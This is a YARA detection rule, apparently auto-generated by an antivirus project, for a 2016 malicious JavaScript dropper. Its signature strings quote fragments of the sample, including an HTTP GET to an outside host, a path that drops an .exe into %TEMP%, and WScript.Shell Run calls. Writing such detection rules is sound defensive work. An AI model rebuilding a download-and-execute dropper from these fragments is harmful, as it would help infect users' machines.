rule sig_20160329_40497d935685ea4e7214af130b509502 {
  meta:
    description = "datamaliciousorder - file 20160329_40497d935685ea4e7214af130b509502.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "cad9a59a5b0902c136eed818f7c307288356b3e76cbc644c92cf4e34b4ea5d07"

  strings:
    $s1  = "z[w](\"GET\", \"http://zilton.com/o9qwp\", false);" fullword ascii
    $s2  = "function WC() {return gp[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ubhyAgks2c.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[uu](Yf() * 11); if (z[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var gp = function Y() {return WScript[L](\"WScript.Shell\");}(), t = 11;" fullword ascii
    $s5  = "function lb(NR, Xo){tM = tM * 1; return NR - Xo;};" fullword ascii
    $s6  = "function VS(){return \"\" + ie;};" fullword ascii
    $s7  = "function y() {return ((Yu == true) && (Yu == f)) ? 1 : tM;};" fullword ascii
    $s8  = "function A(fz){gp[\"Run\"](fz, tM, tM);};" fullword ascii
    $s9  = "var l = new this[\"Date\"]();" fullword ascii
    $s10 = "function pA(){return L;};" fullword ascii
    $s11 = "function Yf(){return 22;};" fullword ascii
    $s12 = " while (Kn){" fullword ascii
    $s13 = "function iX(Jo) {var x = (1, 2, 3, 4, 5, Jo); return x;};" fullword ascii
    $s14 = "return lb(pM, tr);" fullword ascii
    $s15 = "function g()" fullword ascii
    $s16 = "var m = false;" fullword ascii
    $s17 = "var f = false;" fullword ascii
    $s18 = "f = true; " fullword ascii
    $s19 = "Yu = true; " fullword ascii
    $s20 = "var Yu = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}